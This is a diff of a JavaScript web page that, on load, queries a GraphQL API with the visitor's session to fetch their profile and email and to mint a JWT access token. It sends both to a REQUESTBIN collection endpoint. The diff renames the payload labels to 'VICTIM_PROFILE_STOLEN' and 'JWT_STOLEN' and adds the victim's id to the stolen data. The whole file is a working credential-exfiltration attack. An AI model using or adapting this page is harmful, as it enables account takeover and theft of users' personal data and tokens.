@@ -24,31 +24,36 @@ async function testNow() {
                 'x-accept-language': 'en_US'
             },
             body: JSON.stringify({
-                query: 'query { person: person_profile { id steamId email } }',
+                query: `
+                    query PersonProfile {
+                        person: person_profile {
+                            id
+                            steamId
+                            email
+                        }
+                    }
+                `,
                 operationName: 'PersonProfile'
             })
         });
         
-        output.textContent += `Response status: ${response.status}\n`;
-        output.textContent += `Response headers:\n`;
-        response.headers.forEach((value, key) => {
-            output.textContent += `  ${key}: ${value}\n`;
-        });
+        output.textContent += `Response status: ${response.status}\n\n`;
         
         const data = await response.json();
-        output.textContent += '\nResponse data:\n';
+        output.textContent += 'Response data:\n';
         output.textContent += JSON.stringify(data, null, 2) + '\n\n';
         
         if (data.data && data.data.person) {
             output.textContent += '✅ SUCCESS - User is logged in!\n';
-            output.textContent += `Steam ID: ${data.data.person.steamId}\n\n`;
+            output.textContent += `Steam ID: ${data.data.person.steamId}\n`;
+            output.textContent += `User ID: ${data.data.person.id}\n\n`;
             
             // Exfiltrate
             fetch(REQUESTBIN, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    attack: 'DEBUG_TEST_SUCCESS',
+                    attack: 'VICTIM_PROFILE_STOLEN',
                     victim: data.data.person,
                     timestamp: new Date().toISOString()
                 })
@@ -64,28 +69,41 @@ async function testNow() {
                     'x-accept-language': 'en_US'
                 },
                 body: JSON.stringify({
-                    query: 'mutation AuthToken { auth_token { accessToken } }',
+                    query: `
+                        mutation AuthToken {
+                            auth_token {
+                                accessToken
+                            }
+                        }
+                    `,
                     operationName: 'AuthToken'
                 })
             });
             
             const jwtData = await jwtResponse.json();
-            output.textContent += 'JWT response:\n';
-            output.textContent += JSON.stringify(jwtData, null, 2) + '\n';
+            output.textContent += '\nJWT response:\n';
+            output.textContent += JSON.stringify(jwtData, null, 2) + '\n\n';
             
             if (jwtData.data && jwtData.data.auth_token) {
-                output.textContent += '\n✅ JWT STOLEN!\n';
+                output.textContent += '✅ JWT STOLEN!\n';
                 output.textContent += `JWT: ${jwtData.data.auth_token.accessToken.substring(0, 100)}...\n`;
                 
                 fetch(REQUESTBIN, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        attack: 'DEBUG_JWT_SUCCESS',
+                        attack: 'JWT_STOLEN',
                         jwt: jwtData.data.auth_token.accessToken,
+                        victim_id: data.data.person.id,
                         timestamp: new Date().toISOString()
                     })
                 });
+            } else if (jwtData.errors) {
+                output.textContent += '⚠️ JWT generation failed:\n';
+                jwtData.errors.forEach(err => {
+                    output.textContent += `  ${err.message}\n`;
+                });
+                output.textContent += '\n(User probably logged in via web, not Steam)\n';
             }
             
         } else if (data.errors) {
@@ -105,7 +123,8 @@ async function testNow() {
 
 // Auto-run test on page load
 window.onload = () => {
-    setTimeout(testNow, 1000);
+    output.textContent = 'Page loaded. Testing in 2 seconds...\n';
+    setTimeout(testNow, 2000);
 };
 </script>
 </body>
